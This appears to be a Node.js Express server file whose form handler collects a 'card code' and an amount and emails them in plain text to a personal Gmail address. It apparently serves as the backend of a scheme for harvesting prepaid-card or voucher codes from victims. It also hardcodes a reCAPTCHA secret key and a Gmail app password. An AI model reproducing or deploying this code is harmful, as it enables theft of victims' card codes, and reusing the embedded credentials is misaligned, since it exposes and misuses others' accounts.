const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');
const axios = require('axios');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.post('/envoyer-code', async (req, res) => {
  const { numeroCarte, codeSecurite, 'g-recaptcha-response': captcha } = req.body;

  // Validation des champs
  if (!/^\d{1,16}$/.test(numeroCarte)) {
    return res.status(400).send("Code de carte invalide");
  }

  if (!/^\d+(\.\d{1,2})?$/.test(codeSecurite)) {
    return res.status(400).send("Montant invalide");
  }

  // Vérification reCAPTCHA
  if (!captcha) {
    return res.status(400).send("Captcha non rempli.");
  }

  const secretKey = "6Lc49BkrAAAAAED5fyYu7EA57NFm3kcOM9KjZkTt";
  const verifyUrl = `https://www.google.com/recaptcha/api/siteverify?secret=${secretKey}&response=${captcha}`;

  try {
    const response = await axios.post(verifyUrl);
    if (!response.data.success) {
      return res.status(400).send("Échec de vérification reCAPTCHA.");
    }

    // Envoi du mail
    const transporter = nodemailer.createTransport({
      service: 'gmail',
      auth: {
        user: 'wanarnaud@gmail.com',
        pass: 'gyauzfvkgauczwhj'
      }
    });

    const mailOptions = {
      from: 'wanarnaud@gmail.com',
      to: 'wanarnaud@gmail.com',
      subject: 'Code de carte reçu',
      text: `Code: ${numeroCarte}\nMontant: ${codeSecurite}`
    };

    await transporter.sendMail(mailOptions);
    res.send("Code envoyé avec succès !");
  } catch (error) {
    console.error("Erreur lors de l'envoi :", error);
    res.status(500).send("Une erreur est survenue.");
  }
});

app.listen(PORT, () => {
  console.log(`Serveur lancé sur http://localhost:${PORT}`);
});